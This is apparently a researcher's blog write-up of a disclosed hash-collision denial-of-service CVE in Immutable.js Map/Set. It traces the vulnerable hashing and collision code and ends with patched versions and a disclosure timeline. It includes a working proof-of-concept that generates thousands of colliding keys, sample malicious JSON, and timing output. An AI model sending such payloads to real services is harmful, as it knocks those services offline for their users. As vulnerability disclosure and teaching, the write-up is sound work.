# CVE-2026-59880: Hash-collision algorithmic complexity denial of service in Immutable.Map/Set

## Short intro

This is the story of my first CVE: `CVE-2026-59880`, a Hash Collision Denial of Service vulnerability in Immutable.js.

In simple terms: if an application accepts user-controlled data and puts those user-controlled keys into `Immutable.Map` or `Immutable.Set`, an attacker can prepare many different keys that intentionally fall into the same hash bucket. Instead of handling operations quickly as usual, the library has to walk through a long collision list. The result is high CPU usage, slow requests, and potentially a blocked server.

Public advisory:

- CVE: `CVE-2026-59880`
- Advisory: [GHSA-xvcm-6775-5m9r](https://github.com/immutable-js/immutable-js/security/advisories/GHSA-xvcm-6775-5m9r)
- Package affected: npm package `immutable`
- Affected versions: `<5.1.7`
- Patched versions: `4.3.9`, `5.1.8`
- Impact: CPU-bound Denial of Service
- Severity: High, CVSS v4 score `8.7`

## Background

### What is Immutable.js?

Immutable.js is a JavaScript library that provides immutable data structures. Immutable means data is not modified directly. When you change data, the library returns a new version while reusing most of the old structure internally to save memory and improve performance.

Example:

```js
const map1 = Immutable.Map({ name: 'alice' });
const map2 = map1.set('role', 'user');

console.log(map1.toObject());
// { name: 'alice' }

console.log(map2.toObject());
// { name: 'alice', role: 'user' }
```

The important point is that `map1` is not modified after calling `.set()`.

With a normal JavaScript object, we often think that `set` means mutating existing data. In Immutable.js, `.set()` returns a new `Map`.

In the example above:

```text
map1: the original data, only name
map2: the new data, with both name and role
```

So `map1` remains unchanged:

```js
{ name: 'alice' }
```

And `map2` is the new version:

```js
{ name: 'alice', role: 'user' }
```

That is the basic idea of "immutable": do not directly modify the old data; return a new version after every change.

Common Immutable.js structures include:

- `Map`
- `Set`
- `List`
- `Record`
- `OrderedMap`
- `OrderedSet`

In this bug, I focused mostly on `Map` and `Set`, because those two use hashes internally to organize data.

### How do Map and Set use hashes?

To make it easy to imagine, think of a `Map` like a phone book.

When you want to find someone's phone number, you do not want to read the book from beginning to end. You want a way to jump quickly to the right place.

A `hash` is one way to do that.

When a `key` is inserted into a `Map`, the library calculates a number from that `key`. This number helps the library decide where to store the data and where to find it later.

Example:

```js
map.set('username', 'alice');
```

Here:

```text
key   = 'username'
value = 'alice'
```

Immutable.js takes the key `'username'`, calculates its hash, and uses that hash to choose where to store the value.

For a simplified example, imagine a hash function that just sums the character codes:

```text
hash = sum of each character code
```

For the key `'username'`, we can imagine:

```text
u = 117
s = 115
e = 101
r = 114
n = 110
a = 97
m = 109
e = 101
```

Adding them together:

```text
117 + 115 + 101 + 114 + 110 + 97 + 109 + 101 = 864
```

So in this simplified example:

```text
hash('username') = 864
```

Then `Map` uses `864` to decide where the data should be stored.

In short:

```text
key -> calculate hash -> choose storage location -> store value
```

In reality, Immutable.js does not use this simple "sum of characters" formula. It uses a different formula, but the idea is the same: turn a key into a hash number so data can be stored and found quickly.

Normally, this mechanism works well. `Map` operations are fast.

### What is a hash collision?

A hash collision happens when two different keys produce the same hash.

Example:

```text
hash("Aa") = 2112
hash("BB") = 2112
```

The strings `"Aa"` and `"BB"` are different, but they produce the same hash.

A collision is not automatically a bug. Collisions are normal in hash maps, and every hash-map implementation needs a way to handle them.

The problem becomes dangerous when an attacker can create many collisions at once.

At that point, instead of spreading data across many buckets, everything gets forced into one bucket.

```text
Normal:
bucket 1: 2 keys
bucket 2: 2 keys
bucket 3: 2 keys

Under attack:
bucket X: xxxxxxxxx keys
```

When the library needs to find a key inside bucket X, it has to scan through a long list. That is where the DoS smell starts.

## Root cause

The root cause, as I understood it after reading the source, has two parts:

1. Immutable.js string hashing is deterministic, public, and unsalted.
2. When many keys share the same hash, `HashCollisionNode` searches keys through a linear list.

In plain terms:

- The attacker can predict how Immutable.js hashes strings.
- The attacker can precompute many different keys with the same hash.
- Immutable.js puts those keys into the same collision bucket.
- Each read/write has to scan that bucket.

## How I traced the code

Why did I suspect a hash collision issue?

The reason came from the nature of `Map` and `Set`. While reading the documentation and the source, I saw that Immutable.js `Map` and `Set` use hashes internally. That led me to this question:

```text
What happens if many different keys produce the same hash?
```

In most cases, collisions are normal and the library still works fine. But if:

```text
1. the hash function is predictable,
2. the attacker controls the key,
3. the collision bucket is handled by a linear list,
```

then a performance detail can become a security issue.

Immutable.js also exposes a public API:

```js
Immutable.hash(value)
```

This API lets developers calculate the hash of a value. That does not create a vulnerability by itself, but it is a signal worth investigating:

```text
How is the hash calculated?
Does it have a random seed?
Do Map and Set use this same hash internally?
What happens when many keys have the same hash?
```

If string hashing is deterministic and has no random seed, an attacker can prepare colliding keys ahead of time. If an application then puts those keys into `Immutable.Map` or `Immutable.Set`, the library has to process the collision at runtime.

Another important sign is that real endpoints often accept JSON objects from users. In a JSON object, the user can control not only values, but also key names:

```json
{
  "someUserControlledKey": "some value"
}
```

If the application passes that object into `Immutable.Map` or `Immutable.fromJS`, user-chosen keys can enter the Immutable.js hash map.

So my initial hypothesis was:

```text
If Immutable.js uses a predictable string hash,
and Map handles collisions with linear scanning,
then an attacker can create many keys with the same hash and burn CPU.
```

From there, I traced the code to answer three questions:

```text
1. Can the user really control keys that go into Map?
2. Do those keys really reach hash()?
3. How does Immutable.js handle many keys with the same hash?
```

I started from a realistic question:

```text
If an application receives JSON from a user and calls Immutable.fromJS(req.body),
what code path do user-controlled keys travel through?
```

This matters because a hash-collision issue only becomes security-relevant if an attacker controls the data being hashed. If the key is hardcoded by the developer, such as `'username'`, the attacker cannot easily trigger this issue. If the key comes from `req.body`, the story changes.

### Step 1: Start from APIs applications commonly use

The patterns I cared about were:

```js
Immutable.Map(req.body)
Immutable.fromJS(req.body)
state.merge(userObject)
state.mergeDeep(userObject)
```

These patterns are easy to encounter when an application receives a normal object and converts it into Immutable.js data.

I first read `src/fromJS.js`.

The important part:

```js
export function fromJS(value, converter) {
  return fromJSWith(
    [],
    converter || defaultConverter,
    value,
    '',
    converter && converter.length > 2 ? [] : undefined,
    { '': value }
  );
}
```

`fromJS` is the entry point for converting normal JavaScript data into Immutable.js data.

Example:

```js
Immutable.fromJS({
  name: 'alice',
  role: 'user'
});
```

In this example, `value` is the input object. If that object comes from `req.body`, it may be user-controlled data.

This part:

```js
converter || defaultConverter
```

means that if no custom converter is provided, Immutable.js uses the default converter. In real applications, many calls likely look like this:

```js
Immutable.fromJS(req.body)
```

so `defaultConverter` is used.

Then `fromJSWith` handles objects, arrays, and iterables:

```js
const converted = converter.call(
  parentValue,
  key,
  Seq(value).map((v, k) =>
    fromJSWith(stack, converter, v, k, keyPath, value)
  ),
  keyPath && keyPath.slice()
);
```

The part I cared about most was:

```js
Seq(value).map((v, k) => ...)
```

This is where Immutable.js walks through the input object.

In this callback:

```text
value = the object being converted
v     = each field value
k     = each field key
```

If the application calls:

```js
Immutable.fromJS(req.body)
```

then `value` is `req.body`.

If the input is:

```json
{
  "name": "alice",
  "role": "user"
}
```

then `.map((v, k) => ...)` sees:

```text
Iteration 1:
k = "name"
v = "alice"

Iteration 2:
k = "role"
v = "user"
```

The key point is that `k` is the field name from the original JSON.

So if the JSON is sent by an attacker, `k` is attacker-controlled.

If the user sends:

```json
{
  "AaAa": 1,
  "BBBB": 2
}
```

Immutable.js sees:

```text
Iteration 1:
k = "AaAa"
v = 1

Iteration 2:
k = "BBBB"
v = 2
```

Those strings are not just sitting inside the request. They become real keys during conversion.

The default converter then turns the sequence into a Map:

```js
function defaultConverter(k, v) {
  return isIndexed(v) ? v.toList() : isKeyed(v) ? v.toMap() : v.toSet();
}
```

For a normal JSON object, `isKeyed(v)` is true, so it goes into:

```js
v.toMap()
```

This is the step where the user-controlled object becomes an `Immutable.Map`.

The flow is:

```text
User JSON
  -> Immutable.fromJS(req.body)
  -> Seq(value).map((v, k) => ...)
  -> k is the JSON key
  -> defaultConverter(...)
  -> v.toMap()
  -> Immutable.Map contains those keys
```

So the first trace told me:

```text
req.body key -> fromJS -> Seq(value).map((v, k) => ...) -> toMap()
```

In short: a user-controlled key can become a key inside `Immutable.Map`.

### Step 2: Enter the Map constructor

Next, I read `src/Map.js`.

The `Map` constructor contains:

```js
constructor(value) {
  return value === undefined || value === null
    ? emptyMap()
    : isMap(value) && !isOrdered(value)
      ? value
      : emptyMap().withMutations((map) => {
          const iter = KeyedCollection(value);
          assertNotInfinite(iter.size);
          iter.forEach((v, k) => map.set(k, v));
        });
}
```

The most important branch is:

```js
emptyMap().withMutations((map) => {
  const iter = KeyedCollection(value);
  assertNotInfinite(iter.size);
  iter.forEach((v, k) => map.set(k, v));
});
```

`KeyedCollection(value)` adapts different inputs into something Immutable.js can iterate as key/value pairs.

Applications can pass many shapes:

```js
Map({ a: 1, b: 2 })
Map([
  ['a', 1],
  ['b', 2]
])
Map(existingImmutableMap)
```

Immutable.js normalizes those inputs through `KeyedCollection(value)` so the constructor can call `forEach((v, k) => ...)`.

For an object like:

```json
{
  "AaAa": 1,
  "BBBB": 2
}
```

the iterator behaves like:

```text
k = "AaAa", v = 1
k = "BBBB", v = 2
```

Then:

```js
iter.forEach((v, k) => map.set(k, v));
```

is effectively:

```js
map.set('AaAa', 1);
map.set('BBBB', 2);
```

The JSON keys are not removed or transformed into something harmless. They go straight into `map.set`.

`withMutations` is a performance optimization. It batches changes and returns the final immutable result, but it does not remove the collision problem because every `set` still has to find the correct place inside the hash map.

At this point the trace was:

```text
user-controlled JSON key
  -> Immutable.Map / Immutable.fromJS
  -> map.set(k, v)
```

### Step 3: From map.set to updateMap

In `Map`:

```js
set(k, v) {
  return updateMap(this, k, v);
}
```

`set` is a thin wrapper. It passes the work to `updateMap`.

The important point is that `k` remains unchanged. If `k` is user-controlled, `updateMap` receives that same key.

`updateMap` then calls into the internal trie:

```js
newRoot = updateNode(
  map._root,
  map.__ownerID,
  0,
  undefined,
  k,
  v,
  didChangeSize,
  didAlter
);
```

Immutable.js `Map` does not store everything in one flat object. It uses a hash-based tree:

```text
Map
└── root node
    ├── child node
    ├── child node
    └── child node
```

At this point:

```text
keyHash = undefined
k       = key to store
v       = value to store
```

Initially, `keyHash` is `undefined` because Immutable.js has not calculated the hash for the key yet. When a node needs it, Immutable.js calls:

```js
keyHash = hash(key);
```

This is the security-relevant connection:

```text
user-controlled key -> hash(key)
```

If the attacker controls `key`, the attacker controls the input to the hash function.

The trace becomes:

```text
user-controlled JSON key
  -> map.set(k, v)
  -> updateMap(...)
  -> updateNode(...)
  -> hash(key)
```

### Step 4: How string hashing is calculated

From `hash(key)`, I read `src/Hash.ts`.

The `hash` function dispatches based on the value type:

```ts
export function hash(o: unknown): number {
  ...
  switch (typeof v) {
    case 'string':
      return v.length > STRING_HASH_CACHE_MIN_STRLEN
        ? cachedHashString(v)
        : hashString(v);
```

For this bug, I cared about:

```ts
case 'string':
```

because JSON object keys are strings.

The string path eventually reaches `hashString`:

```ts
function hashString(string: string): number {
  let hashed = 0;
  for (let ii = 0; ii < string.length; ii++) {
    hashed = (31 * hashed + string.charCodeAt(ii)) | 0;
  }
  return smi(hashed);
}
```

Meaning:

```text
Start with hashed = 0.
Walk through each character.
Update the hash:
hashed = 31 * hashed + character code
Force the result into a 32-bit integer.
Return the final hash.
```

Example with `"Aa"`:

```text
Start: hashed = 0

Character "A":
charCode("A") = 65
hashed = 31 * 0 + 65 = 65

Character "a":
charCode("a") = 97
hashed = 31 * 65 + 97 = 2112
```

Example with `"BB"`:

```text
Start: hashed = 0

Character "B":
charCode("B") = 66
hashed = 31 * 0 + 66 = 66

Second "B":
charCode("B") = 66
hashed = 31 * 66 + 66 = 2112
```

So:

```text
"Aa" and "BB" are different strings but have the same hash.
```

This is the point the attacker can use. There is no random seed to guess, and the formula is public and deterministic.

The formula `31 * hash + charCode` is the classic Java-style string hash. Because it is deterministic and unsalted, an attacker can precompute colliding strings.

If the two blocks `Aa` and `BB` collide, then concatenating those blocks can create many different strings that still collide.

That led to the hypothesis:

```text
If I generate many object keys from Aa/BB,
all of them can share the same Immutable.hash(),
and Map will have to process one very large collision bucket.
```

### Step 5: How the collision bucket is handled

Knowing that many keys can share the same hash is not enough to call it a vulnerability.

The library could still handle the situation well. For example, it could switch to another data structure, use a secondary seeded hash, or limit bucket size.

So I checked how Immutable.js stores and searches colliding keys.

In `src/Map.js`, I found `HashCollisionNode`:

```js
class HashCollisionNode {
  constructor(ownerID, keyHash, entries) {
    this.ownerID = ownerID;
    this.keyHash = keyHash;
    this.entries = entries;
  }
```

The name says it clearly: this node is used when multiple different keys have the same hash.

It stores:

```js
this.keyHash = keyHash;
this.entries = entries;
```

`keyHash` is the shared hash for the bucket.

`entries` is the list of real key/value pairs.

For example:

```js
entries = [
  ['AaAa', 1],
  ['AaBB', 1],
  ['BBAa', 1],
  ['BBBB', 1]
];
```

The keys have the same hash, but they are still different keys. Immutable.js cannot look only at the hash and assume they are equal. It still has to compare the actual keys.

The `get` function:

```js
get(shift, keyHash, key, notSetValue) {
  const entries = this.entries;
  for (let ii = 0, len = entries.length; ii < len; ii++) {
    if (is(key, entries[ii][0])) {
      return entries[ii][1];
    }
  }
  return notSetValue;
}
```

This does three things:

```text
1. Get the entries list.
2. Walk through the list.
3. If the real key matches, return the value.
```

The dangerous part is:

```js
for (let ii = 0, len = entries.length; ii < len; ii++)
```

This is linear scanning.

If `entries.length = 4`, it may compare up to 4 entries.

If `entries.length = 16,384`, one `get` can compare up to 16,384 entries.

The `update` path also scans `entries`:

```js
const entries = this.entries;
let idx = 0;
const len = entries.length;
for (; idx < len; idx++) {
  if (is(key, entries[idx][0])) {
    break;
  }
}
```

`update` is used for `set` and `remove`.

When inserting a new key, Immutable.js needs to know:

```text
Does this key already exist?
If yes, update it.
If no, append a new entry.
```

To answer that, it scans `entries`.

With colliding keys, building a map looks like:

```text
Insert key 1: scan almost 0 entries
Insert key 2: scan almost 1 entry
Insert key 3: scan almost 2 entries
...
Insert key 16,384: scan almost 16,383 entries
```

The total number of comparisons is close to:

```text
1 + 2 + 3 + ... + 16,384
```

That is why building a `Map` with colliding keys can approach `O(N^2)`. If the number of keys doubles, runtime can grow close to four times.

This confirmed the root cause:

```text
The collision bucket is a linear list.
get/update scan each entry.
There is no seeded secondary hash.
There is no bucket-size limit.
There is no fallback to a balanced structure.
```

### Step 6: PoC evidence

I used AI to help write a PoC that compares:

- normal keys
- colliding keys

The key generator:

```js
function makeCollidingStrings(rounds) {
  let keys = [''];

  for (let round = 0; round < rounds; round++) {
    const next = [];
    for (const key of keys) {
      next.push(key + 'Aa');
      next.push(key + 'BB');
    }
    keys = next;
  }

  return keys;
}
```

This function creates colliding keys by concatenating `Aa` and `BB` blocks.

If `rounds = 1`:

```text
Aa
BB
```

If `rounds = 2`:

```text
AaAa
AaBB
BBAa
BBBB
```

Each round doubles the number of keys:

```text
rounds = 1 -> 2 keys
rounds = 2 -> 4 keys
rounds = 3 -> 8 keys
rounds = 14 -> 16,384 keys
```

This works because `Aa` and `BB` collide under the `31 * hash + charCode` formula. Concatenating blocks with the same hash effect lets us generate many different strings that still collide.

For `rounds = 14`:

```text
2^14 = 16,384
```

The PoC checks the collision using Immutable.js itself:

```js
const collisionHash = Immutable.hash(collisionKeys[0]);

console.log(
  collisionKeys.every((key) => Immutable.hash(key) === collisionHash)
);
```

This is the most important check. The PoC does not just assume the keys collide. It asks Immutable.js:

```js
Immutable.hash(key)
```

If the result is `true`, all generated keys share the same hash according to the library itself.

The full PoC measured:

```js
normal Map build
collision Map build
normal Map read all
collision Map read all
```

I measured both normal and colliding keys to establish a baseline. Without a baseline, it would be hard to know whether the machine, Docker, or `Map` construction in general was slow.

The result:

```text
normal Map build: 40.6 ms
collision Map build: 3617.6 ms
normal Map read all: 7.4 ms
collision Map read all: 2614.5 ms
```

BIG TIME.

This is not merely "there is a collision." The full chain is:

```text
User-controlled key can reach hash().
The hash can be precomputed into collisions.
The collision bucket is handled by linear scanning.
The PoC shows normal vs collision cases differ by tens to hundreds of times.
```

That is the chain that turns an implementation detail into a vulnerability.

## Hash code

In the vulnerable version, Immutable.js hashes strings with a JVM/Java-style formula.

File:

```text
src/Hash.ts
```

Important code:

```ts
function hashString(string: string): number {
  let hashed = 0;
  for (let ii = 0; ii < string.length; ii++) {
    hashed = (31 * hashed + string.charCodeAt(ii)) | 0;
  }
  return smi(hashed);
}
```

Ignoring `| 0` and `smi(hashed)` for a moment, the core idea is:

```text
new hash = old hash * 31 + current character code
```

Because the formula is fixed and has no random seed, an attacker can generate colliding strings ahead of time.

Classic example:

```text
"Aa"
```

`A` has ASCII code `65`, and `a` has ASCII code `97`.

Hash of `"Aa"`:

```text
65 * 31 + 97 = 2112
```

And:

```text
"BB"
```

`B` has ASCII code `66`.

Hash of `"BB"`:

```text
66 * 31 + 66 = 2112
```

Result:

```text
hash("Aa") = hash("BB")
```

The dangerous part is that we can concatenate these blocks:

```text
AaAa
AaBB
BBAa
BBBB
```

They can still fall into the same hash. Repeating this for 14 rounds gives:

```text
2^14 = 16,384 different keys
```

but all of them go into one hash bucket.

## Collision handling code

When many keys share one hash, Immutable.js stores them in `HashCollisionNode`.

File:

```text
src/Map.js
```

Read path:

```js
get(shift, keyHash, key, notSetValue) {
  const entries = this.entries;
  for (let ii = 0, len = entries.length; ii < len; ii++) {
    if (is(key, entries[ii][0])) {
      return entries[ii][1];
    }
  }
  return notSetValue;
}
```

To find a key inside a collision bucket, Immutable.js walks from the beginning to the end of the list and compares each key.

If the bucket has 10 entries, that is fine.

If the bucket has 16,384 entries, each read can do a lot of comparisons.

The update path is similar:

```js
const entries = this.entries;
let idx = 0;
const len = entries.length;
for (; idx < len; idx++) {
  if (is(key, entries[idx][0])) {
    break;
  }
}
```

When inserting a new key, the library must check whether that key already exists. With a large collision bucket, that check becomes expensive.

## Why performance degrades

Normally, `Map` is fast.

But when an attacker forces every key into the same collision bucket:

```text
Each get/set scans the bucket.
Building N keys can approach O(N^2).
Reading N keys can also become very slow.
```

So if the number of keys doubles, runtime may not just double; it can grow close to four times.

That is what turns a performance issue into a security issue.

## Proof of Concept

1. Generate a list of normal keys.
2. Generate a list of colliding keys using the `Aa` / `BB` pattern.
3. Verify that all colliding keys share the same `Immutable.hash()`.
4. Measure time to build an `Immutable.Map`.
5. Measure time to read all keys.

Reduced PoC:

```js
const Immutable = require('../dist/immutable.js');

function makeCollidingStrings(rounds) {
  let keys = [''];

  for (let round = 0; round < rounds; round++) {
    const next = [];
    for (const key of keys) {
      next.push(key + 'Aa');
      next.push(key + 'BB');
    }
    keys = next;
  }

  return keys;
}

function buildImmutableMap(keys) {
  let map = Immutable.Map();
  for (const key of keys) {
    map = map.set(key, 1);
  }
  return map;
}

const collisionKeys = makeCollidingStrings(14);
const collisionHash = Immutable.hash(collisionKeys[0]);

console.log(
  collisionKeys.every((key) => Immutable.hash(key) === collisionHash)
);

const map = buildImmutableMap(collisionKeys);
```

The key evidence is this line:

```js
collisionKeys.every((key) => Immutable.hash(key) === collisionHash)
```

It proves that many different keys share one hash.

Running the full PoC with 16,384 keys produced this result on my test machine:

```text
Immutable.js hash collision DoS PoC
version: 5.1.6
rounds: 14
key count: 16384
collision hash: 665830272
all generated keys share same hash: true

normal Map build: 40.6 ms
collision Map build: 3617.6 ms
normal Map read all: 7.4 ms
collision Map read all: 2614.5 ms
```

That means:

```text
Normal Map build: about 40 ms
Collision Map build: more than 3600 ms
```

With the same number of keys, the collision case was about 89 times slower.

For reads:

```text
Normal read: about 7 ms
Collision read: more than 2600 ms
```

That was about 353 times slower.

Exact numbers vary by machine, but the trend is clear: attacker-shaped data can consume significant CPU.

## Impact

This affects applications that accept user-controlled objects and pass them directly into Immutable.js.

Example:

```js
app.post('/api/import', express.json(), (req, res) => {
  const data = Immutable.fromJS(req.body);
  state = state.mergeDeep(data);
  res.json({ ok: true });
});
```

In JSON, an attacker controls not only values, but also key names.

Normal request:

```json
{
  "name": "alice",
  "theme": "dark"
}
```

Malicious request with many colliding keys:

```json
{
  "AaAaAaAaAaAaAaAaAaAaAaAaAaAa": 1,
  "AaAaAaAaAaAaAaAaAaAaAaAaAaBB": 1,
  "AaAaAaAaAaAaAaAaAaAaAaAaBBAa": 1,
  "AaAaAaAaAaAaAaAaAaAaAaAaBBBB": 1
}
```

In practice, the payload can contain far more keys.

Dangerous patterns include:

```js
Immutable.Map(req.body)
Immutable.fromJS(req.body)
state.merge(userObject)
state.mergeDeep(userObject)
```

In Node.js, the impact is especially visible because JavaScript usually runs on the event loop. If one request burns CPU for too long, other requests can be affected too.

Main impact:

- High CPU usage
- Request timeouts
- Blocked event loop
- Slow or unavailable service

## Patch / Mitigation

Short version: upgrade to:

```text
4.3.9
5.1.8
```

Important note: if an application only uses fixed keys created by the developer, for example:

```js
map.set('username', req.body.username)
```

then the user controls only the value, not the key. That case is much harder to exploit through this issue.

## Timeline

```text
2026-06-05: Report sent to maintainer.
2026-06-05: Maintainer confirmed/triaged.
2026-06-25: Patch prepared or merged.
2026-06-26: GitHub Security Advisory `GHSA-xvcm-6775-5m9r` published.
2026-07-08: Advisory assigned `CVE-2026-59880`.
```

## Reflection

This was my first CVE.

I used to think that if I ever got my first CVE, I would feel extremely happy. When it actually happened, the feeling was different from what I expected.

Looking back, not every security bug requires master-level techniques. Sometimes it comes from a familiar hash formula, a linear collision bucket, and user-controlled input.

The past couple of months had been rough, and by the time the CVE was assigned, I felt more empty than excited.

Still, I am grateful to Codex for staying with me through the dark days and helping me write the PoC.

Time to touch grass.

And before going outside, plug in an AI agent, then come back and claim the result. I have been a bit addicted to AI lately, partly because Codex had a free month.

## Show Respect

Codex - PoC creator

ChatGPT - Blog editor

## References

- GitHub Security Advisory: [GHSA-xvcm-6775-5m9r](https://github.com/immutable-js/immutable-js/security/advisories/GHSA-xvcm-6775-5m9r)
- CVE: `CVE-2026-59880`
- Immutable.js docs: [https://immutable-js.com/](https://immutable-js.com/)
- CWE-400: Uncontrolled Resource Consumption
- CWE-407: Inefficient Algorithmic Complexity
- OWASP API4: Unrestricted Resource Consumption
